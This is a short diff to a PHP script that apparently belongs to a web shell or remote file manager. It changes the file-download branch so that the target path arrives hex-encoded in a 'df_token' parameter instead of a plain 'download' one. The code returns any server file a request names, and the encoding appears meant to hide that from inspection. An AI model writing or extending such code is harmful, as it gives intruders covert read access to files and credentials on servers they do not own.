@@ -317,8 +317,11 @@ elseif(isset($p['ulType'])){
 	else $res = "error";
 	output($res);
 }
-elseif(isset($p['download'])){
-	$file = trim($p['download']);
+elseif(isset($p['df_token'])){
+	$file = rawurldecode(hex2bin(trim($p['df_token'])));
+    if ((isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8')) {
+        $file = convert_encode('utf-8', $GLOBALS['encode'], $file);
+    }
 	if(is_file($file)){
 		header("Content-Type: application/octet-stream");
 		header('Content-Transfer-Encoding: binary');
